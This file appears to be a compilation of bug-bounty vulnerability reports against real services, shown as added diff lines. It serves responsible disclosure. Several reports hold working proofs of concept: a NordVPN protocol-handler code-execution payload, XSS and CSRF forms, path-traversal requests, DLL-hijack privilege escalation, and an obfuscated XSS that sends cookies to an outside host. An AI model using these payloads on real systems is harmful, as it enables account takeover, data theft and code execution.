@@ -1,0 +1,926 @@
+
+Hi,
+I was looking at https://monitoring.prow-canary.k8s.io Grafana webapp. I'm not sure if it is for demo purposes, but I can access the main dashboard and view all graphs.
+https://monitoring.prow-canary.k8s.io/dashboards
+If indeed it is for demo purposes, please let me close the report myself.
+looking forward to hearing from you
+Thank you
+Impact
+access charts on various server resource usage.
+
+
+
+Summary:
+The NordVPN windows client application registered two custom protocols NordVPN: and NordVPN.Notification: for process communication. This makes us are able to communicate with NordVPN.exe from web browser.
+After looking the executable binary, I noticed the class NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl eventually calls function Process.Start with controllable argument, and this notification can be triggered through custom protocol NordVPN.Notification:.
+So it's possible to execute arbitrary system command from web browser.
+Steps To Reproduce:
+// Program.cs
+using System;
+using System.Collections.Generic;
+using NordVpn.Core.Tools;
+using NordVpn.Core.Models.ToastNotifications.Notifications;
+using System.Diagnostics;
+namespace ExploitApp
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Dictionary<string, string> arguments = new Dictionary<string, string>();
+            arguments["OpenUrl"] = "calc.exe";
+            NotificationActionArgs toastArgs = new NotificationActionArgs("", arguments);
+            String exploit = ObjectCompressor.CompressObject(toastArgs);
+            Console.Write(String.Format("NordVPN.Notification:{0}", exploit));
+            Console.ReadKey();
+        }
+    }
+}
+<!-- exploit.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit</title>
+</head>
+<body>
+    <iframe src="NordVPN.Notification:UAAAAB+LCAAAAAAABAANy0EKgCAQBdC7/LV0AHdC0K5WHWAQi4FpFB2hkO5eb/8Glpp7gQcc1mx8cCTjrEFJHuPYZjKC1y7iEOrZr6TW4Ae2knSv8tdIEqd0J7zvBy7afohQAAAA"></iframe>
+</body>
+</html>
+Open the html file in the browser. Modern web browser may popup a window to confirm to open NordVPN.exe, if we choose "Open NordVPN", the command will be executed and popup a calc.exe.
+Proof of Concept Gif
+Tested on Windows client lastest version 6.31.5.0.
+<image_0>
+Additional Information
+The below is the simple call stack to Process.Start from ListenNotificationOpenUrl.
+Code 367 Bytes
+1NordVPN.exe/NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl.OnInteraction(NotificationActionArgs args)
+2    NordVpn.Application.Core.dll/NordVpn.Application.Core.ViewModels.Shell.ShellViewModel.Handle(ShowBrowserMessage message)
+3        NordVPN.exe/NordVpn.Views.Shell.FaultHandlingDefaultBrowser.Open(string url)
+4            Process.Start(string fileName);
+Impact
+Possible to execute system command on victim's computer and take control of the computer.
+
+
+
+XSS to POST
+URL = █████████
+Good morning team DoD..
+I located an XSS on the site.
+I hope to help team DoD more and more. Thank you
+Code 957 Bytes
+1<form action=█████████/WaterControl/shefgraph-historic.cfm?sid=BL110 method=POST><input type=hidden name="fld_graphrslow" value="Y"><input type=hidden name="fld_graphrslow" value="N"><input type=hidden name="Submit" value="View Graph"><input type=hidden name="fld_from1" value="01/01/2020"><input type=hidden name="fld_to1" value="12/31/2020"><input type=hidden name="fld_displaytype" value="S"><input type=hidden name="fld_type1" value="Plot"><input type=hidden name="fld_frompor" value="1&quot;&lt;!--&gt;&lt;Svg OnLoad=(confirm)(1)&lt;!--"><input type=hidden name="fld_topor" value="1231"><input type=hidden name="fld_year1" value="2020"><input type=hidden name="fld_year2" value="2020"><input type=hidden name="fld_mon1" value="01"><input type=hidden name="fld_day1" value="01"><input type=hidden name="fld_mon2" value="12"><input type=hidden name="fld_day2" value="31"><input type=hidden name="fld_param" value="HG"><input type=submit value=XSS></form>
+Impact
+If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:
+Perform any action within the application that the user can perform.
+View any information that the user is able to view.
+Modify any information that the user is able to modify.
+Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.
+
+
+
+Hey,
+I have recently found a website in the namespace of the Amazon Web Services cloud for the US government which exposes a classification header of Unclassified / FOUO. Hence, I thought it might be a good idea to report this vulnerability to you.
+Furthermore, the source code tells us that the website seems to be part of ████████.mil even though the SSL name is "███████":
+Code 231 Bytes
+1
+2	<script type="text/javascript">
+3		// use one of these ██████████ URLs depending on the install environment
+4		var ███████_URL = "https://████████.██████████.mil/";
+5//		var █████_URL = "https://████.█████████.smil.mil/";
+6	</script>
+The proof of concept is as simple as opening the link https://███/.
+For reference, I have found the site via Shodan: https://www.shodan.io/host/█████████
+██████████
+███
+█████
+Impact
+This system is classified as Unclassified / FOUO. Hence, an attacker can access a system which is only for official use only.
+
+
+
+Hi
+There is a CSRF bug on your Website leads to logout user from the dashboard.
+If the user click on the attached file (CSRF.html) redirect to another page and see the following error and the user log out immediately:
+<image_0>
+Steps to reproduce:
+1- Login to your account via Login page
+2- Click on CSRF.html that attached.
+After that, you will redirect to a new page an see the error, the user after clicking on this file log out from account.
+You can see in the CSRF file there isn't any token, but if you place a vaid CSRF token from the source page, this attack will be successful too.
+<image_1>
+If you have any questions, please let me know.
+Best.
+Impact
+An attacker can send the CSRF file to the victim or host it on a website. Whenever the user login in to your website click on file or link will be logged out.
+
+
+
+Hello theendlessweb team,
+Summary:
+the Jira instance on jira.theendlessweb.com is vulnerable to CVE-2020-14179 which allows remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability
+<image_0>
+Steps To Reproduce:
+Navigate to https://jira.theendlessweb.com/secure/QueryComponent!Default.jspa
+Supporting Material/References:
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14179
+Remediation
+Upgrading your jira instance to the most up-to-date one.
+Best Regards,
+nagli.
+Impact
+Affected versions of Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint. The affected versions are before version 8.5.8, and from version 8.6.0 before 8.11.1.
+
+
+
+Hello all
+Using the technique ..; i was able to bypass the protection mechanism to access Tomcat Example Scripts hosted at https://███/.
+Steps to reproduce
+1 - Open all URL's bellow inside your browser
+[ https://█████████/..;/examples/servlets/servlet/SessionExample] | Will lead to Session Manipulation and potential Account Takeover. Because the session is global this servlet poses a big security risk as an attacker can potentially become an administrator by manipulating its session.
+[https://████████/..;/examples/servlets/servlet/CookieExample] | Insecure Cookie Handling
+[https://████████/..;/examples/servlets/] | Source Code Disclosure and an "Execute" option
+[https://███████/..;/examples/servlets/servlet/RequestHeaderExample] | Internal IP disclosure
+PoC
+i upload some images.
+Fixing
+Isolate backend application, Remove the management console and other servlet contexts and Check behaviors between proxy and backend servers.
+More info here, [https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf] --> Orange Tsai -- Blackhat talk -- thanks to him
+Impact
+Apache Tomcat default installation contains the "/examples" directory which has many example servlets and JSPs. Some of these examples are a security risk and should not be deployed on a production server.
+The Sessions Example servlet (installed at /examples/servlets/servlet/SessionExample) allows session manipulation. Because the session is global this servlet poses a big security risk as an attacker can potentially become an administrator by manipulating its session.
+
+
+
+Hi
+There are 3 issues on this report lead to account takeover.
+1- When the user requests a reset password link, server sends a link for the user via email, whenever the user click on the link for the first time redirects to Reset password page but if the user close browser or tab and click again on the link the user will redirect to the wrong address https://hosted.weblate.org/accounts/login and receives the following error:
+<image_0>
+Remediation:
+The reset password link should always redirect the user to the reset password page.
+2- If the user tries to login the account couldn't log in with the current password and receives the following error:
+<image_1>
+Remediation:
+The user should access to her/his account after clicking on the reset password link, it might remember the current password and the user doesn't need to change password
+The above issues are logic issue but at the end leads to account takeover.
+3- When the user request for reset password link, if click on the link and close the reset password page after clicking on the link redirects to the wrong address and couldn't log in via the current password.
+After clicking on reset password link a cookie stores in the browser and remain for hours
+<image_2>
+If the user uses a shared computer or someone access on the user's computer can go to the Forgotten your password page and change the user password.
+Remediation:
+1- The user should always redirect to correct link after clicking on the reset password link.
+2- The cookie remain for hours on the computer, decreasing cookie expiration can decrease account takeover risk.
+For more clarification, please watch the following video:
+████
+If you have any questions, please let me know.
+Knid regards.
+Impact
+A combination of wrong redirection on reset password link and cookie expiration time can lead to account takeover.
+
+
+
+1- Navigate to the system. (https://███████/login.php)
+2- Navigate to register page. (https://██████████/register.php)(i created user, username:██████ pass: TEst.123.!)
+3- Login to the system. (https://███/login.php)
+4- Navigate to "My Profile Page".
+5- Intercept the request.
+6- Change the "UID2=4820038" cookie value with "UID2=4820036".
+7- Send the request to server.
+8- View another user information.
+Impact
+I can view another user information.
+
+
+
+1- Open the burp suite.
+2- Switch the "Repeater" tab.
+3- Paste the content of the attached request into the repeater.
+4- Replace the "UID2 = 4820041" value in the cookie with the ID value of the user to be attacked. Also write the user's email in the "userName" input.
+5- Replace the victim user's password
+Note: Follow the steps in the "1004745" report to get the user's email address.
+Impact
+You can change users' passwords and take over their account.
+
+
+
+Hello all
+I found a DOM based XSS at iqcard.informatica.com
+Description
+After finding the path iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html. I noticed that the code inside attach.html was vulnerable to DOM XSS, due to the fact of the javascript document.location function. search. The code below illustrates the code contained in the attach.html file
+Code 229 Bytes
+1<HTML>
+2<HEAD>
+3<SCRIPT>
+4function GetAttach()
+5{
+6	var strSearch = document.location.search
+7	strSearch = strSearch.substring(1)
+8	
+9	document.location.replace(strSearch)
+10}
+11</SCRIPT>
+12</HEAD>
+13<BODY onload='GetAttach()'>
+14
+15
+16</BODY>
+17</HTML>
+As can be seen through the code above, the variable strSearch receives everything that comes from the URL after the character? and then insert it into the function document.location.replace (). Through this scenario we have some possibilities.
+1 - We can direct the user to any page we want for example:
+Code 76 Bytes
+1https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?evil.com
+2 - We can run a DOM Based XSS, running the javascript schema, javascript: alert (1);
+Code 87 Bytes
+1https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?javascript:alert(1)
+PoC
+I uploaded a video and an image.
+Impact
+An attacker can redirect a user to a malicious page or execute XSS attacks against users of the application or use that domain as a phishing vector to attack other users of informatica.com
+
+
+
+Hello DoD Team
+Summary:
+I have found out that all personal requests made to https://█████ form are being disclosed to the public at https://███████, which posses a critical privacy issue.
+Description:
+While searching my name at google "naglinagli" i have encountered a weird mention of my xss payload at the following endpoint https://██████████, which made realize that all the requests made at the contact form are open to the public
+Step-by-step Reproduction Instructions
+Navigate to https://███████
+File a request.
+█████████
+Your request will publicly appear at https://█████
+████
+
+Suggested Mitigation/Remediation Actions
+Making the access to the vulnerable endpoint to authorized personal only.
+Best Regards,
+nagli.
+Impact
+Personal reports made to █████ including PII of customers is being disclosed to the public through publicly accessible endpoint
+
+
+
+Hello
+Summary:
+I have found at api.tumblr.com two parameters consumer_key && consumer_secret allow to modify oa-consumer_key && oa_consumer_secret cookies values and property.
+An attacker can send a malicious link to reset the cookies of api.tumblr.com, this lead to DOS.
+To trigger the DOS, the target/victim account need to click a malicious link.
+To restore the account, the victim need to delete all cookies on api.tumblr.com.
+Similar issues : https://hackerone.com/reports/583819
+Vulnerable Url
+Code 36 Bytes
+1https://api.tumblr.com/console/auth?
+Vulnerable Paramater(s)
+Code 99 Bytes
+1$_GET['consumer_key'];
+2$_GET['consumer_secret'];
+3$_POST['consumer_key'];
+4$_POST['consumer_secret'];
+Steps To Reproduce:
+Login at https://www.tumblr.com/
+Go to https://www.tumblr.com/oauth/apps and create a random application
+/!\ if the cookies "oa-consumer_key" && "oa_consumer_secret" already exist the attack doesn't work /!\
+After, create your application, click to this malicious following link
+Code 178 Bytes
+1https://api.tumblr.com/console/auth?consumer_key=x;%20domain=tumblr.com;%20Max-Age=1000000000000000000000&consumer_secret=x;%20domain=tumblr.com;%20Max-Age=1000000000000000000000
+Go back to https://www.tumblr.com/oauth/apps and try to connect to api.tumblr.com by clicking in "Explore API".
+You will be redirected to https://www.tumblr.com/oauth/authorize?oauth_token=*&source=console and click to authorize
+loggout and login at tumblr.com
+Try again to connect to your application
+You can follow me in the video POC.
+Thanks, good bye.
+Impact
+Denial of Service and cookies manipulation
+
+
+
+Hello Dod Team,
+Summary:
+PII Leakage of approx 750 personal is being disclosed through the pdf at https://www.██████ which had been uploaded at the 7th of October, this includes Personal phone number and email address.
+Description:
+The list presented at the "dereport.pdf" contains personal info such as phone numbers and private emails of personal in contact with the DoD.
+Step-by-step Reproduction Instructions
+Navigate to https://www.████
+POC
+█████
+██████████
+█████████
+Suggested Mitigation/Remediation Actions
+Provoking the public access to the specified PDF
+Best Regards,
+nagli.
+Impact
+PII Disclosure of DoD personal, this include email addresses and phone numbers.
+
+
+
+Summary:
+When registering on https://████████ it is possible to use path traversal characters in a parameter allowing an attacker to read local files.
+Description:
+The registerUserInfoCommand.nextPageName parameter within the registration form is vulnerable to file path manipulation, where it is possible to submit a request containing path traversal characters (e.g. ../../../) followed by a local file, which will return the contents of the file. This can be used to read local files including sensitive configuration files such as /WEB-INF/web.xml, /WEB-INF/app-config.xml and /WEB-INF/spring/explicit-security-config.xml.
+Impact
+An attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.
+Step-by-step Reproduction Instructions
+Browse to https://██████/████████/register/RegisterUserInfo.htm
+Setup an intercepting proxy (e.g. BurpSuite) and click Next, catching the request in Burp (don't worry about filling out the form fields)
+For ease here I would recommend copying and pasting the below parameters into the request, replacing the parameters that were there originally. This request will fetch the /WEB-INF/web.xml configuration file, I have also attached two other requests which grab app-config.xml and explicity-security-config.xml. Once the parameters are there, forward the request to the server and you should see the web.xml file.
+Code 392 Bytes
+1registerUserInfoCommand.organization=Chantest+Corporation&registerUserInfoCommand.organizationId=49800&registerUserInfoCommand.currPageName=SearchUserOrgInfo.jsp&registerUserInfoCommand.nextPageName=..%2f..%2f..%2fWEB-INF%2fweb.xml&registerUserInfoCommand.prevPageName=jsp%2FRegistration%2FRegisterAccountInfo.jsp&registerUserInfoCommand.submitButton=Choose+This+Organization+and+Continue+%3E
+Product, Version, and Configuration (If applicable)
+N/A
+Suggested Mitigation/Remediation Actions
+Rather than placing the filename of the next page directly in a parameter, it would be better to maintain a whitelist of acceptable filenames and use a unique corresponding identifier to access the file. Then any request containing an invalid identifier can just be rejected. Additionally, you could also sanitise any path traversal characters that may be present in a request.
+Impact
+An attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured.
+
+
+
+Summary:
+I reported the vulnerability to Facebook, and they have said to report it here for the bounty.
+Platform(s) Affected:
+https://en.instagram-brand.com/requests/dashboard
+## Steps To Reproduce:
+Create two account User A, User B at https://en.instagram-brand.com/
+Apply for Instagram brand from https://en.instagram-brand.com/requests/dashboard by User A
+Login to user B and intercept the request
+4.Send a post request with cookie and other header got by intercepting user B in the below endpoint and replace comment 44799 with User A support ticket id
+POST /wp-json/brc/v1/approval-requests/44799/comments HTTP/1.1
+text=sure thanks&files=1597287925578-44741-%3Etest.jpg&sizes=4249
+Supporting Material/References:
+video POC - https://drive.google.com/file/d/1My6MQuQTmYwCWQw_7uw1veGFkn13WkDP/view?usp=sharing
+screenshot of viewing other's messages - https://drive.google.com/file/d/1WnDGPDHGA6pP9RIPBQpEAIXxPTaFJZVX/view?usp=sharing&fbclid=IwAR3k4cEfCcUcfBKhlffQgjDcy4ASRf7V3fsS7FmZcHyyd_HZZfFk1OlDpf8
+Impact
+1) can comment in other's support ticket
+2) can view other's support ticket comments (Both Instagram as well as user's)
+
+
+
+Hi Team,
+I have found a CSRF vulnerability which force victim to add tweets in his collection.
+HTML POC :
+Code 330 Bytes
+1<html>
+2<body>
+3<form action="https://curator.twitter.com/api/collections/STREAM/content" method="POST">
+4<input type="hidden" name="tweet_ids[]" value="667977435124658176">
+5<input type="hidden" name="collections[]" value="667916850294951936">
+6<input type="hidden" name="model[id]" value="STREAM">
+7<input type=submit>
+8</body>
+9</html>
+Before using this POC change the Collection ID to your collection ID and you will see that tweet will be added into your collection.You can Also add so many tweets in one request by adding "tweet_ids" parameter multiple times.
+Let me know if you need any other help from my side.
+Best Regards !
+Vijay Kumar
+
+
+
+Summary
+Large amounts of back-end source code for the Acronis online portals and back-end management portals are publicly exposed. Many of the source code files contain encryption keys and other secrets as well.
+Steps To Reproduce
+Configure your burp proxy to map api.acronis.com to IP: 91.195.23.198 (originally mapped to msg3.acronis.com)
+Browse the following URLs:
+https://api.acronis.com/admin/
+https://api.acronis.com/Elements/
+https://api.acronis.com/ajax/
+https://api.acronis.com/includes/
+https://api.acronis.com/private/
+https://api.acronis.com/login/
+https://api.acronis.com/mag/
+https://api.acronis.com/redirector/
+https://api.acronis.com/op/
+https://api.acronis.com/psg/
+https://api.acronis.com/pad/
+https://api.acronis.com/scripts/
+https://api.acronis.com/podcast/
+https://api.acronis.com/legacy/
+https://api.acronis.com/help/
+https://api.acronis.com/buy/
+https://api.acronis.com/check/
+https://api.acronis.com/events/
+https://api.acronis.com/industry/
+https://api.acronis.com/var/
+These folders contain thousands of source code files that are exposing the internal workings of several public and internal systems used by Acronis as part of its marketing, sales, etc practices.
+Recommendations
+Remove the virtual host configurations from the server to only allow authorized applications to be accessible.
+Disable directory listings.
+Disable source code to be publicly displayed (force execution or restrict access via htaccess)
+Impact
+A large amount of source code for various Acronis platforms is publicly accessible. The source code includes that for their public websites and sales portals, their internal systems such as (office.acronis.com), etc.
+An attacker can leverage the visibility into the source code to exploit a wide range of vulnerabilities across the different platforms.
+There are also several places where secrets and encryption tokens are embedded in plain-text as part of the source code.
+I've attached screenshots of some such examples but I've refrained from downloading or spidering the complete source code available as I believe it would be over-reach in this case.
+
+
+
+Summary
+Acronis True Image 2021 has a feature to send user feedback or application crash report to Acronis Support staff. report_sender.exe is the binary which manages such functionalities. The application is vulnerable to DLL hijacking attack because it searches for non-existing DLL files in locations which can be controlled by the attacker or normal user thus placing a malicious DLL in one of the folder will result it getting loaded by report_sender.exe with Administrator privileges which can be escalated to SYSTEM privileges thus resulting in a Privilege Escalation.
+report_sender.exe looks for the following DLL files and name of any file can be used to exploit the vulnerability.
+CSUNSAPI.dll
+swift.dll
+nfhwcrhk.exe
+SureWareHook.dll
+aep.dll
+atasi.dll
+nusonsll.dll
+ubsec.dll
+Every Windows system contains %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder as a value in the User PATH environment variable where report_sender.exe will search for the DLL if not found in the preceding Search order folders. The malicious DLL file can be placed in this folder as normal user has Full control over this folder.
+{F1035152}
+Even if %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder is not in User PATH environment variable, attacker can add any folder of his choice to the User PATH environment variable as this does not require Administrative permissions.
+Steps To Reproduce
+I created a DLL file which when loaded spawns cmd.exe while giving information as to which application loaded the DLL, path from where the file was loaded, and user privilege. I have attached the DLL file as well as the C++ code to build the DLL below if any necessary changes are to be made.
+[ 1 ] - Copy or write the DLL file with any name from the above specified DLL file names in %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder. I chose ubsec.dll in this example.
+{F1035153}
+[ 2 ] - Go to the Help tab in Acronis True Image and click on Send feedback.
+<image_0>
+[ 3 ] - Fill in the details of the feedback and click on Send.
+<image_1>
+A cmd.exe window will open when report_sender.exe loads the DLL file.
+We can see in the title of the cmd.exe window that it was started with Administrator privileges. To confirm, I ran net session command which gives There are no entries in this list output if executed with Administrator privileges and Access denied if executed as a normal user.
+<image_2>
+Escalating from Administrator privileges to NT AUTHORITY\SYSTEM.
+[ 1 ] - From the Command Prompt that was executed after the DLL was loaded, create a scheduled task by using the Windows built-in schtasks.exe utility.
+schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR C:\Windows\System32\winver.exe /IT /RL HIGHEST
+<image_3>
+[ 2 ] - Run the task created in above step from the elevated Command Prompt.
+schtasks /run /I /TN EOP
+<image_4>
+winver.exe can be seen executed as NT AUTHORITY\SYSTEM resulting in SYSTEM privileged code execution.
+Impact
+Attackers gaining privilege to execute commands as Administrator or NT AUTHORITY\SYSTEM.
+This attack can also work without any user interaction when report_sender.exe automatically sends crash report.
+
+
+
+Hi,
+1)go link items and select text,tile
+2)enter image and give click url as javascript://%0a%0dalert(document.cookie)
+3)xss pop's up
+it is not a self xss because admin can invite many people to his inventory and there sessions can be hijacked.
+regards
+prashanth
+dups team :)
+
+
+
+Summary:
+Hello Team,
+While testing it was observed that on https://app.hey.com/, on Search box there is a possibility of XSS. Although the payload is reflected in the DOM but the CSP blocks the execution of the script, the XSS can happen if the CSP is somehow bypassed. The Subject parameter is vulnerable.
+Apart from XSS, the HTML injection attack is working pretty straight forward.
+Steps To Reproduce:
+Go to https://app.hey.com
+Login to your account.
+Click on 'Write' Mail button.
+Add the recipient as yourself.
+In the Subject, add following payload
+Code 76 Bytes
+1TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
+Send the mail.
+Go to top left corner Search Box and type "TestPayload"
+You will see the mail you sent to yourself, and <a> tag will be there "ClickHere".
+Click on it, you will see the CSP violation in the Console.
+Below is the CSP of the page:
+Code 368 Bytes
+1script-src 'self' https://production.haystack-assets.com stats.hey.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com; 
+2object-src 'none'; 
+3base-uri 'none'; 
+4form-action 'self'; 
+5frame-ancestors 'none'; 
+6report-uri https://sentry.io/api/1371426/security/?sentry_key=3a5ea420eecc45bd9e1d1c2424683f3a&sentry_environment=production&sentry_release=
+As seen from the CSP, there might be a possibility of Host whitelists bypass.
+Impact
+If attacker send such type of mail to a victim and if victim accidentally searches for the same mail then the Script will be executed leading to account takeover. This is possible only if CSP is bypassed.
+
+
+
+Hello DoD team,
+Third time a charm :-)
+I really cannot explain what is going on with this ██████████ website,
+You just locked the report so i can't comment there, but it seems it works right now and i have proof of a video with time stamp.
+I am talking about #1002977, i hope you will see this fast enough when it still works.
+███████
+Summary:
+Reflected Cross site Scripting (XSS) on https://██████████████████
+Steps To Reproduce:
+Navigate to https://████████████
+Alert will pop :-)
+█████████
+Recommendations for fix
+Content based escaping on the users input, in this case on the url parameter.
+Best Regards,
+nagli
+Impact
+Attacker can execute JS code on the Victim Behalf.
+
+
+
+Summary:
+The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
+The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request.
+Steps To Reproduce:
+XSS
+use a proxy like burp suite and turn intercept on
+upload a file to the support chat
+change the filename to \"><img src=1 onerror=\"url=String104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp'GET',url,true;xhttp'send';
+open the chat support and xss will activate
+CSRF
+create a file html in some server
+create a form with a file and the payload name
+send to a new tab. This one will post the image with payload
+Supporting Material/References:
+https://onlinestringtools.com/convert-string-to-ascii to convert the attacker's website link to ascii
+Impact
+Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
+For the guys of support chat, they don't even need to click in the link for the XSS activate.
+
+
+
+Summary:
+Hello, I have found a Cross-site request forgery in ``https://tumblr.com/svc/user/filtered_content``` allow an attacker to add filtered content to a target/victim account.
+The custom HTTP Header X-tumblr-form-key used for the protection CSRF is not validate.
+Steps To Reproduce:
+1) Logging into your Tumblr account in your current navigator .
+2) Open the poc.html or manually copy this following code in an html file and open this in your current navigator and click to Submit request.
+Code 373 Bytes
+1
+2<html>
+3
+4  <!-- CSRF PoC - generated by Burp Suite Professional -->
+5
+6  <body>
+7
+8  <script>history.pushState('', '', '/')</script>
+9
+10    <form action="https://www.tumblr.com/svc/user/filtered_content" method="POST">
+11
+12      <input type="hidden" name="filtered&#95;content" value="pwd777" />
+13
+14      <input type="submit" value="Submit request" />
+15
+16    </form>
+17
+18  </body>
+19
+20</html>
+3) Go to https://www.tumblr.com/settings/account and you will see the keyword pwd777 in your filtered content .
+/!\ You can't add a same filtered content this will generate a 400 HTTP Response code /!\
+You can follow me in the video POC.
+Thanks, good bye.
+Impact
+Allow a attacker add filtered content to a target/victim account.
+
+
+
+Summary
+I found the problem of cache poisoning in www.acronis.com. A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.
+Steps To Reproduce
+Use x-forwarded-port to destroy the cache, repeat the request until www.acronis.com:0 appears in the response
+Code 823 Bytes
+1GET /zh-cn/careers/?yig1bt7ai4=1 HTTP/1.1
+2Host: www.acronis.com
+3Connection: close
+4sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
+5sec-ch-ua-mobile: ?0
+6Upgrade-Insecure-Requests: 1
+7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
+8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
+9Sec-Fetch-Site: same-origin
+10Sec-Fetch-Mode: navigate
+11Sec-Fetch-User: ?1
+12Sec-Fetch-Dest: document
+13Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
+14Accept-Encoding: gzip, deflate, yig1bt7ai4
+15Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+16x-forwarded-port: zwrtxqvas9lm4kzkia
+17Origin: https://yig1bt7ai4.com
+Remove the parameters, x-forwarded-port, and origin in the request header. Then send the request, the cache has been polluted (due to the cache hit, it may take several more requests).
+Code 742 Bytes
+1GET /zh-cn/careers/ HTTP/1.1
+2Host: www.acronis.com
+3Connection: close
+4sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
+5sec-ch-ua-mobile: ?0
+6Upgrade-Insecure-Requests: 1
+7User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 yig1bt7ai4
+8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9, text/yig1bt7ai4
+9Sec-Fetch-Site: same-origin
+10Sec-Fetch-Mode: navigate
+11Sec-Fetch-User: ?1
+12Sec-Fetch-Dest: document
+13Referer: https://www.acronis.com/zh-cn/cloud/cyber-protect/
+14Accept-Encoding: gzip, deflate, yig1bt7ai4
+15Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+3.Other users visit the /zh-cn/careers/ page, and the result has been poisoned.
+4.The currently discovered causes of cache poisoning:
+url params (if there is reflected XSS on the server side, it will be very dangerous)
+x-forwarded-port header
+x-forwarded-url header
+Recommendations
+Cache poisoning is caused by different requests hitting the same cache. Remove these influencing factors, or only cache requests with unchanged results.
+Impact
+Launch a denial of service attack
+If a page contains url parameters or request header reflection XSS, cache poisoning can easily spread the page containing malicious code to other people without the need to communicate with the victim
+More ways to exploit:
+https://portswigger.net/research/practical-web-cache-poisoning
+https://portswigger.net/research/web-cache-entanglement
+
+
+
+Summary
+Because the HTML is not sanitized when taking the input on https://accounts.informatica.com/registration.html, the input is vulnerable to XSS. When a payload such as
+"><script src=https://monty.xss.ht></script>
+is put into the form under company it triggers a blind xss. When the payload successfully is loaded, it dumps information as a POC.
+Steps to reproduce
+1) Goto https://accounts.informatica.com/registration.html and create a temporary account
+2) Enter a blind xss payload into the Company field
+3) Wait until an admin opens the user record
+4) Then, the report should be generated ( I used https://xsshunter.com/)
+Supporting Materials
+As mentioned, the blind XSS gave me the following IP address who loaded the admin panel:
+████████
+The URL of where the payload fired:
+https://█████████/phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit&TargetUser=480514&FromSearch=True#loaded
+This cookie:
+Code 1.32 KiB
